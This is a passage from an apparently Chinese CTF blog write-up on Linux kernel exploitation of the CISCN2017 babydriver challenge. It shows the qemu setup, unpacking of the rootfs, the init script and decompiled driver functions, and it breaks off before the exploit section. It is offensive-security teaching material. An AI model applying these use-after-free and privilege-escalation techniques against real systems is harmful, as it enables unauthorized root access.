<!DOCTYPE html><html lang="en"><head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
    <meta name="description" content="前面写了kernel pwn的最基础的知识，接下来就是各种各样的攻击手法，但基本都离不开代码审计  Kernel UAF通过前面的知识，回过头再看CISCN2017 - babydriver  题目链接：https://github.com/z1r00/ctf-pwn/tree/main/kernel_pwn/ciscn_babydriver  准备下载tar，然后解压，会出现三个文件，通过前面">
<meta property="og:type" content="article">
<meta property="og:title" content="kernel-pwn（四）attack之uaf &amp; rop">
<meta property="og:url" content="http://example.com/2021/11/25/kernel-pwn%EF%BC%88%E5%9B%9B%EF%BC%89%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/index.html">
<meta property="og:site_name" content="z1r0's blog">
<meta property="og:description" content="前面写了kernel pwn的最基础的知识，接下来就是各种各样的攻击手法，但基本都离不开代码审计  Kernel UAF通过前面的知识，回过头再看CISCN2017 - babydriver  题目链接：https://github.com/z1r00/ctf-pwn/tree/main/kernel_pwn/ciscn_babydriver  准备下载tar，然后解压，会出现三个文件，通过前面">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/2021/11/25/kernel-pwn%EF%BC%88%E5%9B%9B%EF%BC%89%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/1.png">
<meta property="og:image" content="http://example.com/2021/11/25/kernel-pwn%EF%BC%88%E5%9B%9B%EF%BC%89%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/2.png">
<meta property="og:image" content="http://example.com/2021/11/25/kernel-pwn%EF%BC%88%E5%9B%9B%EF%BC%89%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/3.png">
<meta property="og:image" content="http://example.com/2021/11/25/kernel-pwn%EF%BC%88%E5%9B%9B%EF%BC%89%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/4.png">
<meta property="og:image" content="http://example.com/2021/11/25/kernel-pwn%EF%BC%88%E5%9B%9B%EF%BC%89%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/5.png">
<meta property="og:image" content="http://example.com/2021/11/25/kernel-pwn%EF%BC%88%E5%9B%9B%EF%BC%89%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/6.png">
<meta property="og:image" content="http://example.com/2021/11/25/kernel-pwn%EF%BC%88%E5%9B%9B%EF%BC%89%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/7.png">
<meta property="og:image" content="http://example.com/2021/11/25/kernel-pwn%EF%BC%88%E5%9B%9B%EF%BC%89%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/8.png">
<meta property="og:image" content="http://example.com/2021/11/25/kernel-pwn%EF%BC%88%E5%9B%9B%EF%BC%89%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/9.png">
<meta property="og:image" content="http://example.com/2021/11/25/kernel-pwn%EF%BC%88%E5%9B%9B%EF%BC%89%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/10.png">
<meta property="og:image" content="http://example.com/2021/11/25/kernel-pwn%EF%BC%88%E5%9B%9B%EF%BC%89%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/11.png">
<meta property="og:image" content="http://example.com/2021/11/25/kernel-pwn%EF%BC%88%E5%9B%9B%EF%BC%89%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/12.png">
<meta property="article:published_time" content="2021-11-25T00:53:13.000Z">
<meta property="article:modified_time" content="2023-08-17T06:32:24.134Z">
<meta property="article:author" content="z1r0">
<meta property="article:tag" content="kernel_pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2021/11/25/kernel-pwn%EF%BC%88%E5%9B%9B%EF%BC%89%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/1.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>kernel-pwn（四）attack之uaf &amp; rop</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
      <link rel="alternate" href="/true" title="z1r0's blog" type="application/atom+xml">
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.1.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/z1r00?tab=repositories">Projects</a></li><!--
     --><!--
       --><li><a href="/links/">links</a></li><!--
     -->
      </ul>
    </span>
    <br>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2022/01/08/glibc-2-23%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2021/11/21/kernel-pwn%EF%BC%88%E4%B8%89%EF%BC%89%E9%98%B2%E5%BE%A1%E6%9C%BA%E5%88%B6/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/11/25/kernel-pwn%EF%BC%88%E5%9B%9B%EF%BC%89%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/11/25/kernel-pwn%EF%BC%88%E5%9B%9B%EF%BC%89%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/&amp;text=kernel-pwn（四）attack之uaf &amp; rop"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/11/25/kernel-pwn%EF%BC%88%E5%9B%9B%EF%BC%89%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/&amp;title=kernel-pwn（四）attack之uaf &amp; rop"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/11/25/kernel-pwn%EF%BC%88%E5%9B%9B%EF%BC%89%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/&amp;is_video=false&amp;description=kernel-pwn（四）attack之uaf &amp; rop"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=kernel-pwn（四）attack之uaf &amp; rop&amp;body=Check out this article: http://example.com/2021/11/25/kernel-pwn%EF%BC%88%E5%9B%9B%EF%BC%89%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/11/25/kernel-pwn%EF%BC%88%E5%9B%9B%EF%BC%89%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/&amp;title=kernel-pwn（四）attack之uaf &amp; rop"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/11/25/kernel-pwn%EF%BC%88%E5%9B%9B%EF%BC%89%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/&amp;title=kernel-pwn（四）attack之uaf &amp; rop"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/11/25/kernel-pwn%EF%BC%88%E5%9B%9B%EF%BC%89%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/&amp;title=kernel-pwn（四）attack之uaf &amp; rop"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/11/25/kernel-pwn%EF%BC%88%E5%9B%9B%EF%BC%89%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/&amp;title=kernel-pwn（四）attack之uaf &amp; rop"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/11/25/kernel-pwn%EF%BC%88%E5%9B%9B%EF%BC%89%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/&amp;name=kernel-pwn（四）attack之uaf &amp; rop&amp;description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/11/25/kernel-pwn%EF%BC%88%E5%9B%9B%EF%BC%89%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/&amp;t=kernel-pwn（四）attack之uaf &amp; rop"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Kernel-UAF"><span class="toc-number">1.</span> <span class="toc-text">Kernel UAF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%86%E5%A4%87"><span class="toc-number">1.1.</span> <span class="toc-text">准备</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-amp-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><span class="toc-number">1.2.</span> <span class="toc-text">逆向分析 &amp; 漏洞挖掘</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#init-amp-exit"><span class="toc-number">1.2.1.</span> <span class="toc-text">init &amp; exit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#open-amp-release"><span class="toc-number">1.2.2.</span> <span class="toc-text">open &amp; release</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#write-amp-read"><span class="toc-number">1.2.3.</span> <span class="toc-text">write &amp; read</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ioctl"><span class="toc-number">1.2.4.</span> <span class="toc-text">ioctl</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞利用思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">1.4.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Kernel-ROP"><span class="toc-number">2.</span> <span class="toc-text">Kernel ROP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%86%E5%A4%87-1"><span class="toc-number">2.1.</span> <span class="toc-text">准备</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-amp-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-1"><span class="toc-number">2.2.</span> <span class="toc-text">逆向分析 &amp; 漏洞挖掘</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#init-amp-exit-1"><span class="toc-number">2.2.1.</span> <span class="toc-text">init &amp; exit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ioctl-1"><span class="toc-number">2.2.2.</span> <span class="toc-text">ioctl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#read"><span class="toc-number">2.2.3.</span> <span class="toc-text">read</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#copy-func"><span class="toc-number">2.2.4.</span> <span class="toc-text">copy_func</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#write"><span class="toc-number">2.2.5.</span> <span class="toc-text">write</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-1"><span class="toc-number">2.3.</span> <span class="toc-text">漏洞利用思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#save-status"><span class="toc-number">2.3.1.</span> <span class="toc-text">save status</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rop-%E9%93%BE"><span class="toc-number">2.3.2.</span> <span class="toc-text">rop 链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80"><span class="toc-number">2.3.3.</span> <span class="toc-text">获取函数地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96gadget"><span class="toc-number">2.3.4.</span> <span class="toc-text">获取gadget</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-1"><span class="toc-number">2.4.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Reference"><span class="toc-number">3.</span> <span class="toc-text">Reference</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        kernel-pwn（四）attack之uaf &amp; rop
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
        <span itemprop="name">z1r0</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2021-11-25T00:53:13.000Z" itemprop="datePublished">2021-11-25</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/kernel/">kernel</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/kernel-pwn/" rel="tag">kernel_pwn</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <blockquote>
<p>前面写了kernel pwn的最基础的知识，接下来就是各种各样的攻击手法，但基本都离不开代码审计</p>
</blockquote>
<h1 id="Kernel-UAF"><a href="#Kernel-UAF" class="headerlink" title="Kernel UAF"></a>Kernel UAF</h1><p>通过前面的知识，回过头再看CISCN2017 - babydriver</p>
<blockquote>
<p>题目链接：<a target="_blank" rel="noopener" href="https://github.com/z1r00/ctf-pwn/tree/main/kernel_pwn/ciscn_babydriver">https://github.com/z1r00/ctf-pwn/tree/main/kernel_pwn/ciscn_babydriver</a></p>
</blockquote>
<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>下载tar，然后解压，会出现三个文件，通过前面的知识可以明确知道这些是什么东西。</p>
<p><img src="/2021/11/25/kernel-pwn%EF%BC%88%E5%9B%9B%EF%BC%89%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/1.png"></p>
<p>看boot，解包，运行boot。</p>
<figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append <span class="string">'console=ttyS0 root=/dev/ram oops=panic panic=1'</span> -enable-kvm -monitor /dev/null -m 64M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep</span><br></pre></td></tr></tbody></table></figure>

<p>boot启动脚本很正常。接下来运行一下，一切都没问题就可以解包，进ida</p>
<p><img src="/2021/11/25/kernel-pwn%EF%BC%88%E5%9B%9B%EF%BC%89%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/2.png"></p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  cb2 file rootfs.cpio </span><br><span class="line">rootfs.cpio: gzip compressed data, last modified: Tue Jul  4 08:39:15 2017, max compression, from Unix, original size modulo 2^32 2</span><br></pre></td></tr></tbody></table></figure>

<p>gzip的包，给它移到一个文件夹里改后缀，解压然后再解包。</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  cb2 <span class="built_in">mkdir</span> file_system</span><br><span class="line">➜  cb2 <span class="built_in">cp</span> rootfs.cpio ./file_system/rootfs.cpio.gz</span><br><span class="line">➜  cb2 <span class="built_in">cd</span> file_system </span><br><span class="line">➜  file_system gunzip rootfs.cpio.gz </span><br><span class="line">➜  file_system cpio -idmv &lt; rootfs.cpio </span><br><span class="line"></span><br><span class="line">➜  file_system <span class="built_in">ls</span></span><br><span class="line">bin  etc  home  init  lib  linuxrc  proc  rootfs.cpio  sbin  sys  tmp  usr</span><br></pre></td></tr></tbody></table></figure>

<p>有一个init这个文件，看一下</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">➜  file_system <span class="built_in">cat</span> init </span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"> </span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line"><span class="built_in">chown</span> root:root flag</span><br><span class="line"><span class="built_in">chmod</span> 400 flag</span><br><span class="line"><span class="built_in">exec</span> 0&lt;/dev/console</span><br><span class="line"><span class="built_in">exec</span> 1&gt;/dev/console</span><br><span class="line"><span class="built_in">exec</span> 2&gt;/dev/console</span><br><span class="line"></span><br><span class="line">insmod /lib/modules/4.4.72/babydriver.ko</span><br><span class="line"><span class="built_in">chmod</span> 777 /dev/babydev</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\nBoot took <span class="subst">$(cut -d' ' -f1 /proc/uptime)</span> seconds\n"</span></span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></tbody></table></figure>

<p>给flag roo权限所以这题得进行提权其它的都是正常的linux命令。</p>
<p>接下来就是对ko进行逆向</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  file_system <span class="built_in">cd</span> lib/modules/4.4.72 </span><br><span class="line">➜  4.4.72 <span class="built_in">ls</span></span><br><span class="line">babydriver.ko</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/2021/11/25/kernel-pwn%EF%BC%88%E5%9B%9B%EF%BC%89%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/3.png"></p>
<h2 id="逆向分析-amp-漏洞挖掘"><a href="#逆向分析-amp-漏洞挖掘" class="headerlink" title="逆向分析 &amp; 漏洞挖掘"></a>逆向分析 &amp; 漏洞挖掘</h2><p>给64位的ko进ida吧。</p>
<p><img src="/2021/11/25/kernel-pwn%EF%BC%88%E5%9B%9B%EF%BC%89%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/4.png"></p>
<h3 id="init-amp-exit"><a href="#init-amp-exit" class="headerlink" title="init &amp; exit"></a>init &amp; exit</h3><p>先看一下init和exit这两个函数</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">babydriver_init</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">  __int64 v0; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// edx</span></span><br><span class="line">  __int64 v2; <span class="comment">// rsi</span></span><br><span class="line">  __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// ebx</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> *<span class="title">v5</span>;</span> <span class="comment">// rax</span></span><br><span class="line">  __int64 v6; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v7; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( alloc_chrdev_region(&amp;babydev_no, <span class="number">0LL</span>, <span class="number">1LL</span>, <span class="string">"babydev"</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">  {</span><br><span class="line">    cdev_init(&amp;cdev_0, &amp;fops);</span><br><span class="line">    v2 = babydev_no;</span><br><span class="line">    cdev_0.owner = &amp;_this_module;</span><br><span class="line">    v4 = cdev_add(&amp;cdev_0, babydev_no, <span class="number">1LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v4 &gt;= <span class="number">0</span> )</span><br><span class="line">    {</span><br><span class="line">      v5 = _class_create(&amp;_this_module, <span class="string">"babydev"</span>, &amp;babydev_no);</span><br><span class="line">      babydev_class = v5;</span><br><span class="line">      <span class="keyword">if</span> ( v5 )</span><br><span class="line">      {</span><br><span class="line">        v7 = device_create(v5, <span class="number">0LL</span>, babydev_no, <span class="number">0LL</span>, <span class="string">"babydev"</span>);</span><br><span class="line">        v1 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v7 )</span><br><span class="line">          <span class="keyword">return</span> v1;</span><br><span class="line">        printk(&amp;unk_351, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">        class_destroy(babydev_class);</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      {</span><br><span class="line">        printk(&amp;unk_33B, <span class="string">"babydev"</span>, v6);</span><br><span class="line">      }</span><br><span class="line">      cdev_del(&amp;cdev_0);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      printk(&amp;unk_327, v2, v3);</span><br><span class="line">    }</span><br><span class="line">    unregister_chrdev_region(babydev_no, <span class="number">1LL</span>);</span><br><span class="line">    <span class="keyword">return</span> v4;</span><br><span class="line">  }</span><br><span class="line">  printk(&amp;unk_309, <span class="number">0LL</span>, v0);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>init这个函数对/dev/babydev设备初始化</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">babydriver_exit</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">  device_destroy(babydev_class, babydev_no);</span><br><span class="line">  class_destroy(babydev_class);</span><br><span class="line">  cdev_del(&amp;cdev_0);</span><br><span class="line">  unregister_chrdev_region(babydev_no, <span class="number">1LL</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>exit这个函数对/dev/baby/dev进行清理，都很正常。</p>
<h3 id="open-amp-release"><a href="#open-amp-release" class="headerlink" title="open &amp; release"></a>open &amp; release</h3><p>接下来对open和release进行逆向</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">babyopen</span><span class="params">(inode *inode, file *filp)</span></span><br><span class="line">{</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  babydev_struct.device_buf = kmem_cache_alloc_trace(kmalloc_caches[<span class="number">6</span>], <span class="number">37748928LL</span>, <span class="number">64LL</span>);</span><br><span class="line">  babydev_struct.device_buf_len = <span class="number">64LL</span>;</span><br><span class="line">  printk(<span class="string">"device open\n"</span>, <span class="number">37748928LL</span>, v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>open这个函数申请一块空间，大小为 0x40 字节，地址存储在全局变量 babydev_struct.device_buf 上，并更新 babydev_struct.device_buf_len</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">babyrelease</span><span class="params">(inode *inode, file *filp)</span></span><br><span class="line">{</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  kfree(babydev_struct.device_buf);</span><br><span class="line">  printk(<span class="string">"device release\n"</span>, filp, v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>release对buf进行释放。还有write和read函数</p>
<h3 id="write-amp-read"><a href="#write-amp-read" class="headerlink" title="write &amp; read"></a>write &amp; read</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> __fastcall <span class="title function_">babyread</span><span class="params">(file *filp, <span class="type">char</span> *buffer, <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">size_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">size_t</span> v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line">  <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  result = <span class="number">-2LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">  {</span><br><span class="line">    v6 = v4;</span><br><span class="line">    copy_to_user(buffer);</span><br><span class="line">    <span 